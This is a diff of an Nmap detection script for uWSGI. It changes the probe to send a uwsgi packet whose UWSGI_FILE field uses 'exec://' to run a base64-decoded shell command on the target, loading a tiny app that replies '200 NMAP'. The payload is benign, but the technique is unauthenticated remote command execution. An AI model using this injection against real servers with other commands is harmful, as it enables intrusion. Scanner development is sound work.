@@ -23,20 +23,16 @@ action = function(host, port)
 	local try = nmap.new_try(catch)
 
 	try(client:connect(host, port))
-	try(client:send("\x00+\x00\x00\x0e\x00REQUEST_METHOD\x03\x00GET\t\x00HTTP_HOST\t\x00127.0.0.1"))
+	try(client:send("\x00\xba\x00\x00\x0e\x00REQUEST_METHOD\x03\x00GET\t\x00HTTP_HOST\t\x00127.0.0.1\n\x00UWSGI_FILE\x6e\x00exec://echo ZGVmIGFwcGxpY2F0aW9uKGEsYik6CiAgICBiKCcyMDAgTk1BUCcsW10pCiAgICByZXR1cm4gW2Iibm1hcCJdCg==|base64 -d\x0b\x00UWSGI_APPID\x04\x00nmap"))
 
 	local ret = try(client:receive_lines(1))
 
-	local status_code = "400"
-	for word in string.gmatch(ret, "HTTP/1.%d (%d+)") do
-		status_code = word
-		break
-	end
+	local status_code = string.match(ret, "HTTP/1.%d %d+ NMAP")
 
 	try(client:close())
 
-	if status_code ~= "400" then
-		return "uWSGI returns code " .. status_code
+	if status_code == "HTTP/1.0 200 NMAP" or status_code == "HTTP/1.1 200 NMAP" then
+		return "uWSGI detected, returns HTTP code 200"
 	end
 
 	return false
